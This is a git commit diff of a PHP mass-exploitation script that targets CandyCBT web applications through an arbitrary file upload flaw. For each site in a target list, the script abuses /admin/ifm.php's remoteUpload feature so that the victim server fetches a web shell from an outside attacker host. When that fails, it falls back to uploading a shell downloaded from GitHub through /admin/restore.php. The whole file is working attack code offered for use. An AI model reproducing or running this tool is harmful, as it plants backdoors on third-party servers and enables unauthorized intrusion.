842eddbe395e5c2891b40f01c5ab8ab3d2ed6442
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2022-10-09 22:52:43 +0700

    Update candycbt-mass.php

--- candycbt-mass.php
+++ candycbt-mass.php
@@ -1,16 +1,20 @@
 <?php
 
-error_reporting(0);
+error_reporting();
 
-function req($url) {
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_POST, true);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, "api=remoteUpload&dir=&filename=xx.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	$xx = curl_exec($ch);
-	curl_close($ch);
-	return $xx;
+function req($url, $post = null) {
+  $ch = curl_init();
+  curl_setopt($ch, CURLOPT_URL, $url);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+  if ($post) {
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+  }
+  curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+  $xx = curl_exec($ch);
+  curl_close($ch);
+  return $xx;
 }
 
 $green = "\033[0;32m";
@@ -21,29 +25,42 @@ $white = "\033[1;37m";
 system("clear");
 
 echo $blue."
- _______                 _       _______ ______ _______ 
+ _______                 _       _______ ______ _______
 (_______)               | |     (_______|____  (_______)
  _       _____ ____   __| |_   _ _       ____)  )  _     Arbitrary
 | |     (____ |  _ \ / _  | | | | |     |  __  (  | |    File
 | |_____/ ___ | | | ( (_| | |_| | |_____| |__)  ) | |    Upload
- \______)_____|_| |_|\____|\__  |\______)______/  |_|   
+ \______)_____|_| |_|\____|\__  |\______)______/  |_|
                           (____/                        v.2^
-                          
-       {$white}Author: N4ST4R_ID | www.nyamuxpl0it.cf
+       {$white}Author: N4ST4R_ID | www.naxtarrr.my.id
  \n";
 
 $web = $argv[1];
-if(!$web) exit("{$red}[!] Usage php {$argv[0]} list.txt\n");
-if(!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
+if (!$web) exit("{$red}[!] Usage php {$argv[0]} list.txt\n");
+if (!file_exists($web)) exit("{$red}[!] File {$argv[1]} not found\n");
 $get = file_get_contents($web);
 $exp = explode("\n", $get);
-foreach($exp as $explode) {
-	$request = req($explode."/admin/ifm.php");
-	//echo $request." > ".$explode."\n";
-	if(preg_match("/File successfully uploaded/", $request)) {
-		echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/files/xx.php\n\n";
-	} else {
-		echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n\n";
-	}
+
+if (!file_exists("nax.php")) {
+  $open = fopen("nax.php", "w");
+  fwrite($open, file_get_contents("https://raw.githubusercontent.com/nastar-id/naxtarrr-shell/main/nax-shell.php"));
+  fclose($open);
+}
+$shell = new CURLFile("nax.php");
+
+foreach ($exp as $explode) {
+  $request = req($explode."/admin/ifm.php", "api=remoteUpload&dir=&filename=nax.php&method=curl&url=http://naxtarrr.fortysinc.com/nax.txt");
+  if (preg_match("/File successfully uploaded/", $request)) {
+    echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/files/nax.php\n\n";
+  } else {
+    echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n";
+    echo "{$blue}[*] Checking restore file\n";
+    $upload2 = req($explode."/admin/restore.php", ["datafile" => $shell]);
+    if (preg_match("/berhasil/", $upload2)) {
+      echo "{$green}[+] File successfully uploaded \n[+] ".$explode."/admin/nax.php\n\n";
+    } else {
+      echo "{$red}[-] Upload successfully failed > \n[-] ".$explode."\n\n";
+    }
+  }
 }
 ?>
